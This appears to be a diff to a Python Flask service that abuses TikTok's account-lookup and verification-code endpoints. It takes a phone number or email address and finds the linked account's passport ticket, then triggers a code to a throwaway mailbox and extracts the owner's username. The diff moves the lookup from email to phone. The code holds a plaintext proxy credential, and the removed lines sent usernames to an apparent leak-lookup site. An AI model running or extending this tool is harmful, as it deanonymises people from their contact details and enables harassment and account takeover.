@@ -18,13 +18,13 @@ except ImportError:
     os.system("pip install SignerPy")
     import SignerPy
 
+
 # ============================================
 # Network & Configuration
 # ============================================
 class Network:
     def __init__(self):
         self.proxy = "http://finmtozcdx303317:d3MU8i4MaJc2GF7P_country-UnitedStates@isp2.hydraproxy.com:9989"
-
         self.hosts = [
             "api31-normal-useast2a.tiktokv.com",
             "api22-normal-c-alisg.tiktokv.com",
@@ -39,7 +39,6 @@ class Network:
             "api19-normal-c-useast1a.musical.ly",
             "api.tiktokv.com",
         ]
-
         self.send_hosts = [
             "api22-normal-c-alisg.tiktokv.com",
             "api31-normal-alisg.tiktokv.com",
@@ -47,7 +46,6 @@ class Network:
             "api16-normal-probe-useast2a.tiktokv.com",
             "rc-verification-sg.tiktokv.com"
         ]
-
         self.params = {
             'device_platform': 'android',
             'ssmix': 'a',
@@ -70,10 +68,10 @@ class Network:
             "ac": "wifi",
             "request_tag_from": "h5",
         }
-
         self.headers = {
             'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux; U; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/{str(random.randint(1, 10**19))})'
         }
+
 
 # ============================================
 # MailTM disposable email
@@ -123,6 +121,7 @@ class MailTM:
                     await asyncio.sleep(3)
             return None
 
+
 # ============================================
 # MobileFlowFlexible
 # ============================================
@@ -131,13 +130,8 @@ class MobileFlowFlexible:
         self.input = account_param.strip()
         self.session = requests.Session()
         self.net = Network()
-        
         if self.net.proxy:
-            self.session.proxies = {
-                "http": self.net.proxy,
-                "https": self.net.proxy
-            }
-
+            self.session.proxies = {"http": self.net.proxy, "https": self.net.proxy}
         self.base_params = self.net.params.copy()
         try:
             self.base_params = SignerPy.get(params=self.base_params)
@@ -150,17 +144,14 @@ class MobileFlowFlexible:
         self.headers = self.net.headers.copy()
 
     def _variants(self):
-        v = []
-        raw = self.input
-        v.append(raw)
-        v.append(raw.strip().lower())
-        seen = set()
-        out = []
-        for item in v:
-            if item not in seen:
-                seen.add(item)
-                out.append(item)
-        return out
+        v = [self.input]
+        if self.input.isdigit():
+            try:
+                v.append(self.input.encode().hex())
+            except Exception:
+                pass
+        v.append(self.input.strip().lower())
+        return list(dict.fromkeys(v))
 
     async def find_passport_ticket(self, timeout_per_host: int = 10):
         variants = self._variants()
@@ -176,7 +167,7 @@ class MobileFlowFlexible:
                 try:
                     signature = SignerPy.sign(params=params)
                 except Exception as e:
-                    print(f"[LOG] SignerPy.sign failed for host {host} variant {acct[:30]}: {e}")
+                    print(f"[LOG] SignerPy.sign failed for host {host}: {e}")
                     continue
 
                 headers = self.headers.copy()
@@ -190,8 +181,7 @@ class MobileFlowFlexible:
                     'x-ladon': signature.get('x-ladon', ''),
                 })
 
-                # تعديل الرابط ليكون email بدل mobile
-                url = f"https://{host}/passport/account_lookup/email/"
+                url = f"https://{host}/passport/account_lookup/mobile/"
                 try:
                     resp = await asyncio.to_thread(self.session.post, url, params=params, headers=headers, timeout=timeout_per_host)
                     try:
@@ -200,20 +190,19 @@ class MobileFlowFlexible:
                         print(f"[{host}] non-json response (truncated): {resp.text[:300]}")
                         continue
 
+                    # ✅ تعديل: طباعة الريسبونس كامل
+                    print(f"[{host}] FULL RESPONSE (mobile): {json.dumps(j, ensure_ascii=False)}")
+
                     if resp.status_code != 200:
-                        print(f"[{host}] status {resp.status_code} -> {json.dumps(j)[:400]}")
                         continue
 
                     accounts = j.get('data', {}).get('accounts', [])
                     if not accounts:
-                        print(f"[{host}] no accounts -> {json.dumps(j)[:400]}")
                         continue
 
                     first = accounts[0]
                     ticket = first.get('passport_ticket') or first.get('not_login_ticket') or None
                     username = first.get('user_name') or first.get('username') or None
-
-                    print(f"[{host}] response snippet: {json.dumps(j)[:800]}")
                     if ticket:
                         return ticket, acct, j
                     if username and not ticket:
@@ -265,23 +254,28 @@ class MobileFlowFlexible:
                 try:
                     j = resp.json()
                 except ValueError:
-                    print(f"[send_code {host}] non-json response (truncated): {resp.text[:300]}")
+                    print(f"[send_code {host}] non-json response: {resp.text[:300]}")
                     continue
 
-                print(f"[send_code {host}] response snippet: {json.dumps(j)[:800]}")
+                # ✅ تعديل: طباعة الريسبونس كامل
+                print(f"[send_code {host}] FULL RESPONSE: {json.dumps(j, ensure_ascii=False)}")
+
                 if j.get("message") == "success" or j.get("status") == "success":
                     body = await mail_client.mailbox(token, timeout=timeout_mailbox)
                     if not body:
                         print("[LOG] No email arrived in mailbox (timeout).")
                         return None, mail
+
+                    # ✅ تعديل: طباعة الرسالة كاملة
+                    print("[LOG] Full email body:")
+                    print(body)
+
                     ree = re.search(r'تم إنشاء هذا البريد الإلكتروني من أجل\s+(.+)\.', body)
                     if ree:
                         return ree.group(1).strip(), mail
                     ree2 = re.search(r'username[:\s]+([A-Za-z0-9_\.]+)', body, re.IGNORECASE)
                     if ree2:
                         return ree2.group(1).strip(), mail
-                    print("[LOG] Email arrived but username not found. Body (trimmed):")
-                    print(body[:2000])
                     return None, mail
                 else:
                     continue
@@ -290,6 +284,7 @@ class MobileFlowFlexible:
                 continue
         return None, mail
 
+
 # ============================================
 # Flask API
 # ============================================
@@ -297,77 +292,29 @@ app = Flask(__name__)
 
 @app.route("/extract", methods=["GET"])
 def extract():
-    raw_email = request.args.get("email", "")
+    raw_phone = request.args.get("phone", "")
     timeout_mailbox = int(request.args.get("timeout_mailbox", "120"))
-
-    email = unquote(raw_email).replace(" ", "").strip()
-    print(f"[LOG] استعلام جديد بالإيميل: {email}")
-
-    flow = MobileFlowFlexible(account_param=email)
+    phone = unquote(raw_phone).replace(" ", "").strip()
+    if not phone.startswith("+"):
+        phone = "+" + phone
+    print(f"[LOG] استعلام جديد برقم: {phone}")
+    flow = MobileFlowFlexible(account_param=phone)
 
     async def run_flow():
         try:
             ticket, used_variant, resp_json = await flow.find_passport_ticket()
         except Exception as e:
-            print(f"[LOG] خطأ أثناء البحث عن passport_ticket: {e}")
-            return {
-                "input": email,
-                "status": "error",
-                "message": "خطأ أثناء الاتصال بـ TikTok API",
-                "username": None,
-                "passport_ticket": None,
-                "mail_used": None,
-                "used_variant": None,
-                "raw_response_snippet": None,
-                "tiktokinfo": None
-            }
+            return {"status": "error", "message": str(e)}
 
         if not ticket:
-            print(f"[LOG] الإيميل {email} ما عليه يوزر أو لا توجد تذكرة")
-            return {
-                "input": email,
-                "status": "not_found",
-                "username": None,
-                "passport_ticket": None,
-                "mail_used": None,
-                "used_variant": used_variant,
-                "raw_response_snippet": None if resp_json is None else str(resp_json)[:500],
-                "tiktokinfo": None
-            }
+            return {"status": "not_found", "used_variant": used_variant, "raw_response": resp_json}
 
-        print(f"[LOG] نجح استخراج التذكرة: {ticket}")
         username, mail_used = await flow.send_code_using_ticket(passport_ticket=ticket, timeout_mailbox=timeout_mailbox)
-
-        if username:
-            print(f"[LOG] استخرجنا اليوزر: {username} باستخدام البريد {mail_used}")
-            status_final = "success"
-        else:
-            print(f"[LOG] ما قدرنا نطلع يوزر للبريد {mail_used}")
-            status_final = "no_username"
-
-        tiktokinfo = None
-        if username:
-            try:
-                resp = requests.get(f"https://leakmrjoj.in/707/tik1.php?username={username}", timeout=10, proxies=flow.session.proxies)
-                tiktokinfo = resp.json()
-            except:
-                tiktokinfo = {
-                    "message": "User information is not available, please try again."
-                }
-
-        return {
-            "input": email,
-            "status": status_final,
-            "username": username,
-            "passport_ticket": ticket,
-            "mail_used": mail_used,
-            "used_variant": used_variant,
-            "raw_response_snippet": None if resp_json is None else str(resp_json)[:500],
-            "tiktokinfo": tiktokinfo
-        }
+        return {"status": "success" if username else "no_username", "username": username, "passport_ticket": ticket, "mail_used": mail_used, "raw_response": resp_json}
 
     result = asyncio.run(run_flow())
     return jsonify(result)
+
 
 # ============================================
 # Run Flask
